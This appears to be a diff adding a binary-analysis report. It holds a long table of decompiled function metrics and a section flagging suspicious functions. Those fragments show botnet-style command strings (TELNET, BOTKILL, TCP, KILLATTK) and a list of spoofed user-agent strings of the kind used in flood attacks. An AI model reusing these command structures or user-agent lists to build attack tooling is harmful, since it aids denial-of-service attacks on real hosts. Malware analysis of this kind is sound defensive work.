+function_10009df8                                 |6   |262     |3             |55          |
+----------------------------------------------------------------------------------------------
+function_1000e004                                 |3   |296     |3             |82          |
+----------------------------------------------------------------------------------------------
+function_1000106c                                 |3   |526     |3             |315         |
+----------------------------------------------------------------------------------------------
+function_1000fa58                                 |2   |461     |3             |269         |
+----------------------------------------------------------------------------------------------
+function_100118e0                                 |6   |955     |3             |631         |
+----------------------------------------------------------------------------------------------
+function_1000e0c0                                 |1   |291     |3             |67          |
+----------------------------------------------------------------------------------------------
+function_10013114                                 |4   |281     |3             |62          |
+----------------------------------------------------------------------------------------------
+function_10008b3c                                 |1   |329     |3             |129         |
+----------------------------------------------------------------------------------------------
+function_1000b2e0                                 |1   |331     |2             |107         |
+----------------------------------------------------------------------------------------------
+function_1000ca44                                 |2   |239     |2             |30          |
+----------------------------------------------------------------------------------------------
+function_1000fca4                                 |5   |257     |2             |54          |
+----------------------------------------------------------------------------------------------
+function_10013cd8                                 |0   |197     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_10010800                                 |2   |280     |2             |81          |
+----------------------------------------------------------------------------------------------
+function_1000de0c                                 |2   |297     |2             |27          |
+----------------------------------------------------------------------------------------------
+function_10000aec                                 |1   |250     |2             |60          |
+----------------------------------------------------------------------------------------------
+function_10002f74                                 |1   |257     |2             |61          |
+----------------------------------------------------------------------------------------------
+function_10011820                                 |1   |276     |2             |73          |
+----------------------------------------------------------------------------------------------
+function_10003118                                 |7   |299     |2             |99          |
+----------------------------------------------------------------------------------------------
+function_10010c00                                 |5   |307     |2             |52          |
+----------------------------------------------------------------------------------------------
+function_10011650                                 |4   |310     |2             |83          |
+----------------------------------------------------------------------------------------------
+function_10012de8                                 |2   |311     |2             |62          |
+----------------------------------------------------------------------------------------------
+function_100117e4                                 |3   |225     |2             |30          |
+----------------------------------------------------------------------------------------------
+function_100023d0                                 |0   |211     |2             |19          |
+----------------------------------------------------------------------------------------------
+function_1000df60                                 |0   |272     |2             |24          |
+----------------------------------------------------------------------------------------------
+function_10014470                                 |0   |215     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_1000c228                                 |1   |198     |1             |9           |
+----------------------------------------------------------------------------------------------
+function_1000e750                                 |2   |210     |1             |20          |
+----------------------------------------------------------------------------------------------
+function_1000d3d4                                 |0   |376     |1             |115         |
+----------------------------------------------------------------------------------------------
+function_1000cb54                                 |3   |214     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_10013280                                 |2   |255     |1             |59          |
+----------------------------------------------------------------------------------------------
+function_10001d64                                 |3   |213     |1             |21          |
+----------------------------------------------------------------------------------------------
+function_1000a62c                                 |3   |220     |1             |19          |
+----------------------------------------------------------------------------------------------
+function_10012f98                                 |3   |288     |1             |69          |
+----------------------------------------------------------------------------------------------
+function_10002878                                 |2   |211     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_10001bc4                                 |1   |239     |1             |23          |
+----------------------------------------------------------------------------------------------
+function_100005c0                                 |2   |221     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_10012cc8                                 |0   |256     |1             |36          |
+----------------------------------------------------------------------------------------------
+function_1001437c                                 |2   |286     |1             |66          |
+----------------------------------------------------------------------------------------------
+function_1000f1b8                                 |2   |253     |1             |46          |
+----------------------------------------------------------------------------------------------
+function_10000e6c                                 |7   |299     |1             |18          |
+----------------------------------------------------------------------------------------------
+function_100106b4                                 |0   |293     |1             |37          |
+----------------------------------------------------------------------------------------------
+function_1000296c                                 |5   |255     |1             |31          |
+----------------------------------------------------------------------------------------------
+function_10002bfc                                 |0   |220     |1             |21          |
+----------------------------------------------------------------------------------------------
+function_1001305c                                 |3   |271     |1             |10          |
+----------------------------------------------------------------------------------------------
+function_1000e2d4                                 |0   |279     |1             |4           |
+----------------------------------------------------------------------------------------------
+function_100131e4                                 |1   |223     |1             |26          |
+----------------------------------------------------------------------------------------------
+function_1000e3f0                                 |3   |218     |1             |28          |
+----------------------------------------------------------------------------------------------
+function_1001356c                                 |3   |239     |1             |44          |
+----------------------------------------------------------------------------------------------
+function_1000df0c                                 |2   |210     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_100142b0                                 |1   |269     |1             |52          |
+----------------------------------------------------------------------------------------------
+function_10001e4c                                 |1   |215     |1             |18          |
+----------------------------------------------------------------------------------------------
+function_1000d2bc                                 |1   |235     |1             |35          |
+----------------------------------------------------------------------------------------------
+function_1000f738                                 |0   |276     |1             |41          |
+----------------------------------------------------------------------------------------------
+function_10009ce8                                 |1   |208     |1             |18          |
+----------------------------------------------------------------------------------------------
+function_100007b4                                 |4   |211     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_10014260                                 |2   |228     |1             |36          |
+----------------------------------------------------------------------------------------------
+function_1001012c                                 |6   |365     |1             |18          |
+----------------------------------------------------------------------------------------------
+function_1000f2a0                                 |3   |319     |1             |12          |
+----------------------------------------------------------------------------------------------
+function_1000c264                                 |3   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100105f4                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e7cc                                 |2   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100006f8                                 |1   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000740                                 |1   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ec00                                 |4   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014128                                 |2   |331     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ed20                                 |5   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10012820                                 |2   |472     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f548                                 |1   |191     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014668                                 |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f0b8                                 |1   |240     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000eddc                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c404                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100033f0                                 |1   |1677    |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c714                                 |3   |223     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000b5a0                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100008f4                                 |6   |196     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100106a4                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010040                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100113c0                                 |0   |232     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ed5c                                 |3   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000cbb4                                 |4   |241     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010648                                 |3   |200     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000eee8                                 |2   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013b9c                                 |2   |197     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001063c                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014684                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e694                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10008730                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000dd4c                                 |3   |344     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ef10                                 |0   |193     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ee08                                 |2   |251     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100089f0                                 |6   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10001734                                 |3   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ef38                                 |2   |192     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10001918                                 |2   |502     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001045c                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013b20                                 |3   |205     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000cb04                                 |0   |201     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e69c                                 |1   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100124bc                                 |1   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000aa4                                 |1   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001057c                                 |1   |240     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100017e4                                 |3   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f5b4                                 |2   |220     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10002dc4                                 |4   |240     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000168                                 |0   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c524                                 |2   |205     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c33c                                 |3   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ec34                                 |5   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100100ac                                 |1   |201     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f4c0                                 |3   |192     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e48c                                 |1   |203     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f43c                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100144b8                                 |3   |224     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001291c                                 |2   |804     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000213c                                 |1   |207     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e460                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ed90                                 |2   |200     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100103cc                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000b13c                                 |0   |223     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100122a8                                 |3   |205     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10011744                                 |1   |212     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c85c                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10001688                                 |7   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000468                                 |0   |207     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10012554                                 |3   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e528                                 |0   |317     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c44c                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000b578                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000df40                                 |2   |201     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100126e8                                 |2   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001161c                                 |7   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000dddc                                 |2   |208     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010bc4                                 |1   |210     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ffac                                 |1   |204     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001250c                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010048                                 |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013a5c                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e3e0                                 |4   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c494                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100104a4                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014574                                 |2   |259     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c048                                 |3   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100124d8                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c824                                 |2   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ec70                                 |4   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c9c0                                 |1   |192     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100087a0                                 |5   |339     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c59c                                 |1   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100024a8                                 |2   |199     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001236c                                 |1   |306     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10011470                                 |2   |370     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010414                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100000b8                                 |0   |214     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c684                                 |5   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c140                                 |2   |208     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100104ec                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10012bdc                                 |3   |199     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c78c                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000014c                                 |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ef60                                 |1   |269     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f258                                 |4   |196     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100108e0                                 |3   |267     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e68c                                 |2   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c7d4                                 |3   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e834                                 |1   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e800                                 |1   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ece0                                 |7   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100126f4                                 |1   |270     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001452c                                 |2   |191     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f904                                 |1   |230     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100009c4                                 |2   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c83c                                 |2   |191     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010b44                                 |2   |230     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100088e0                                 |3   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000eca8                                 |4   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014058                                 |1   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+entry_point                                       |2   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c2f4                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c868                                 |8   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000a1c                                 |2   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001004c                                 |2   |202     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c7dc                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100006b0                                 |1   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10008adc                                 |2   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000d378                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000fdd8                                 |1   |492     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ebcc                                 |3   |187     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014108                                 |1   |191     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f3cc                                 |1   |193     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c5f4                                 |5   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c6cc                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c1c4                                 |1   |201     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000380                                 |1   |192     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10012250                                 |7   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c2ac                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000fc20                                 |0   |197     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1001259c                                 |1   |236     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010398                                 |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000c48                                 |2   |200     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000d644                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f284                                 |4   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e6c4                                 |2   |229     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10012c34                                 |3   |203     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014618                                 |1   |204     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e454                                 |3   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100020c0                                 |3   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013970                                 |3   |203     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010534                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000ca34                                 |0   |188     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c5ac                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e2a4                                 |3   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_100001d4                                 |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c8f4                                 |0   |202     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c130                                 |0   |191     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c384                                 |0   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000e698                                 |1   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000dbf8                                 |4   |250     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c63c                                 |1   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000dcb0                                 |0   |376     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010780                                 |5   |190     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000db9c                                 |2   |196     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10010a4c                                 |0   |359     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013bc8                                 |4   |219     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10001edc                                 |3   |252     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f6a8                                 |2   |223     |0             |0           |
+----------------------------------------------------------------------------------------------
+unknown_0                                         |2   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c3cc                                 |1   |195     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10013230                                 |1   |197     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000f81c                                 |4   |218     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1000c4dc                                 |2   |198     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10000238                                 |2   |223     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10014088                                 |4   |205     |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : function_1000a77c ===================
+++++++++ FUNCTION START 15303
+++++++++ FUNCTION END 17957
+++++++++ FUNCTION LENGTH 2654
+    if (function_1000df0c((char *)*a2, (int32_t)"PING") == 0) {
+        if (function_1000df0c((char *)*a2, (int32_t)"TELNET") == 0) {
+                    function_100017e4(v179, (int32_t)"[TELNET] OFF", 0x10020000);
+                            function_10008b3c(function_100017e4(v179, (int32_t)"[TELNET] ON", 0x10020000));
+                            if (function_1000df0c((char *)*a2, (int32_t)"BOTKILL") == 0) {
+                                    v223 = function_100017e4(v186, (int32_t)"Killing - %s", v213);
+                            if (function_1000df0c((char *)*a2, (int32_t)"TCP") == 0) {
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    while (true) {
+                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                    while (true) {
+                                                                result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                while (true) {
+                                                            result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                    if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                        while (true) {
+                                                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                while (true) {
+                                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                    while (true) {
+                                                                                result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                while (true) {
+                                                                            result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    while (true) {
+                                                                                    if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                        while (true) {
+                                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                while (true) {
+                                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                while (true) {
+                                                                            result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                    while (true) {
+                                                                                result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                            while (true) {
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                        while (true) {
+                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                    while (true) {
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    while (true) {
+                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                    while (true) {
+                                                                result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                while (true) {
+                                                            result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                    if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                        while (true) {
+                                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                while (true) {
+                                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                while (true) {
+                                                                            result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    while (true) {
+                                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                    while (true) {
+                                                                                result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                            while (true) {
+                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                            while (true) {
+                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                    if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                        while (true) {
+                                                                    result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                        if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                            while (true) {
+                                                                                        result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+                                                                                    while (true) {
+                                                                                if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                    while (true) {
+                                                                                if (function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER") == 0) {
+                                                                            if (function_1000df0c((char *)*a2, (int32_t)"KILLATTK") == 0) {
+                                                                                while (true) {
+                                                                        while (true) {
+                                                                                while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                        while (true) {
+                                                                while (true) {
+                                                    while (true) {
+                if (function_1000df0c((char *)*a2, (int32_t)"BOTKILL") == 0) {
+                        v223 = function_100017e4(v186, (int32_t)"Killing - %s", v213);
+                if (function_1000df0c((char *)*a2, (int32_t)"TCP") == 0) {
+                                                                                    while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                while (true) {
+                                            while (true) {
+                                                                            while (true) {
+                                                            while (true) {
+                                                                    while (true) {
+                                                        while (true) {
+                                                            while (true) {
+                                            while (true) {
+                                                    while (true) {
+                                        while (true) {
+                function_100017e4(v179, (int32_t)"TELNET ON | OFF", 0x10020000);
+            if (function_1000df0c((char *)*a2, (int32_t)"BOTKILL") == 0) {
+                    v223 = function_100017e4(v186, (int32_t)"Killing - %s", v213);
+            if (function_1000df0c((char *)*a2, (int32_t)"TCP") == 0) {
+                                                                                while (true) {
+                                                                while (true) {
+                                                                        while (true) {
+                                                            while (true) {
+                                        while (true) {
+                                                        while (true) {
+                                        while (true) {
+=================FUNCTION : function_10010cfc ===================
+++++++++ FUNCTION START 51585
+++++++++ FUNCTION END 55552
+++++++++ FUNCTION LENGTH 3967
+            while (true) {
+                while (true) {
+                                    while (true) {
+                                                                                    while (true) {
+                                                                                                        while (true) {
+                                                                                                    while (true) {
+                                                                                                while (true) {
+                                                                                        while (true) {
+                                                                                    while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                            while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                while (true) {
+                                                                                    while (true) {
+                                                                                        while (true) {
+                                                                                    while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                            while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                                                while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                while (true) {
+                                                                            while (true) {
+                                                                    while (true) {
+                                                                    while (true) {
+                                                            while (true) {
+                                                                                while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                while (true) {
+                                                                                while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                while (true) {
+                                                                            while (true) {
+                            while (true) {
+        while (true) {
+=================FUNCTION : function_10000094 ===================
+++++++++ FUNCTION START 301
+++++++++ FUNCTION END 789
+++++++++ FUNCTION LENGTH 488
+        "Unknown host",
+        "Host name lookup failure",
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
+        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
+        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
+        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
